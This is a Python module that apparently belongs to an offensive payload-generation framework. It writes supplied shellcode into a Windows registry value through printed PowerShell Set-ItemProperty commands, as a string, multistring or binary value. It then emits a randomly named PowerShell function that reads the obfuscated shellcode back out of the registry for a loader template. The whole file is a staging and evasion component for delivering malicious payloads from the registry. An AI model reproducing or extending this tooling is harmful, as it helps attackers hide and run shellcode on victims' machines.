import random
import string
import json
from utils.utils import *

class regkey:

    def __init__(self, shellcode, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'path' in arguments:
            self.path = arguments['path']
        else:
            self.path = 'HKCU:\\Software\\'
        if 'key' in arguments:
            self.key = arguments['key']
        else:
            self.key = 'test'
        self.type = type(shellcode).__name__
        if self.type == 'str':
            print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Value "{shellcode}"')
        elif self.type == 'list':
            print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Type MultiString -Value @({','.join([f"'{x}'" for x in shellcode])})')
        elif self.type == 'bytes':
            print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Type Binary -Value {','.join([f'0x{shellcode[i]:02x}' for i in range(0, len(shellcode))])}')

    def imports(self):
        return []

    def codeblock(self):

        return f"""

function {self.name} {{
    $obfuscated = (Get-ItemProperty -Path {self.path} -Name {self.key}).{self.key}
    return $obfuscated;
}}
"""

    def compilerOptions(self):
        return []

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}')
